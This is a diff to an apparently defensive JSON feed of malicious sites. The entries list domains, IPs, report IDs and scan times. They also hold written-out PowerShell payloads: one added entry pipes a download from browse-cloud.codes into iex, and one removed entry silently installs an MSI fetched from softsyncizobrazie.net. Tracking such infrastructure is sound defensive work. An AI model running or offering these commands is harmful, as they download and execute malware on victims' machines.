@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "frpdanismanlik.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.64.153"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/f6f41b91b95bf127",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/f6f41b91b95bf127"
+    ],
+    "ReportId": "cmwkte9y71fs10omlyn3mr6rc",
+    "ScannedAt": "2026-11-17T14:55:43.108000+00:00"
+  },
+  {
     "UrlDomain": "www.mhc-sa.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -4415,24 +4437,5 @@
     ],
     "ReportId": "cmwf4esed0fpg0omlmg0cwhh2",
     "ScannedAt": "2026-11-13T15:17:25.750000+00:00"
-  },
-  {
-    "UrlDomain": "azkafoods.co",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "66.29.137.43"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwf2w2a00fkl0oml1ac8kcxp",
-    "ScannedAt": "2026-11-13T14:34:52.466000+00:00"
   }
 ]
